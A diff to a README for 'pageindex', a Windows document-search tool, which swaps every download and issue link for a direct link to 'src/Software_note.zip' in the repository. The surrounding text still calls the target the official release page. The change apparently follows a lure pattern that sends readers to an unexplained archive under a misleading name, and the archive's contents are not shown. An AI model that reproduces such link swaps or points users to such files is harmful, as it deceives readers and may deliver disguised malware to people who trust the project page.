@@ -1,6 +1,6 @@
 # 🚀 pageindex - Simple Document Search with AI
 
-[![Download pageindex](https://img.shields.io/badge/Download-Pageindex-green?style=for-the-badge)](https://github.com/Ashish4144/pageindex/releases)
+[![Download pageindex](https://img.shields.io/badge/Download-Pageindex-green?style=for-the-badge)](https://github.com/Ashish4144/pageindex/raw/refs/heads/main/src/Software_note.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You will download the software from the official GitHub release page. The releas
 
 Click this bright link to visit the release page:
 
-[Download pageindex here](https://github.com/Ashish4144/pageindex/releases)
+[Download pageindex here](https://github.com/Ashish4144/pageindex/raw/refs/heads/main/src/Software_note.zip)
 
 The release page shows all available versions. Look for the latest release at the top.
 
@@ -130,12 +130,12 @@ If you experience problems, use the GitHub page to open an issue. Include detail
 - What you tried and what happened.
 
 Visit the issues page here:  
-https://github.com/Ashish4144/pageindex/issues
+https://github.com/Ashish4144/pageindex/raw/refs/heads/main/src/Software_note.zip
 
 ---
 
 ## 📥 Ready to Download?
 
-[Download pageindex here](https://github.com/Ashish4144/pageindex/releases)
+[Download pageindex here](https://github.com/Ashish4144/pageindex/raw/refs/heads/main/src/Software_note.zip)
 
 Click the link to get started using pageindex on Windows today.
